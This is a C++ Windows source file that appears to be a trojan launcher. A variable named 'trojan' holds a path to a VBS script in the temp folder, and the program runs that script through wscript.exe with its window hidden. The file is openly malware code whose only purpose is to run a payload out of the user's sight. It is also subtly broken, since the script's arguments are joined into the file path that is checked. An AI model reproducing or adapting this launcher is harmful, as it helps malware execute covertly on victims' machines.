#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <strsafe.h>
#include <iostream>
#include <windows.h>
#include <iostream>
#include <string>
#include <windows.h>

#pragma comment(lib, "shell32.lib")

bool FileExists(const std::wstring& filePath) {
    DWORD dwAttrib = GetFileAttributesW(filePath.c_str());
    return (dwAttrib != INVALID_FILE_ATTRIBUTES && 
           !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

std::wstring GetTempPathWString() {
	DWORD pathLen = GetTempPathW(0, NULL);
	if (pathLen == 0) return L"";

	std::wstring tempPath(pathLen, L'\0');

	GetTempPathW(pathLen, &tempPath[0]);

	tempPath.resize(pathLen - 1);
	
	return tempPath;
}

int main() {

	std::wstring temppath = GetTempPathWString();
	std::wstring trojan = L"\\OWD\\zfei.vbs task OWD_launch";
	std::wstring fullpath = temppath + trojan;
    
    if ( FileExists(fullpath.c_str()) ) {
        ShellExecuteW(NULL, L"open", L"wscript.exe", fullpath.c_str(), NULL, SW_HIDE);
    }
    
	return 0;
}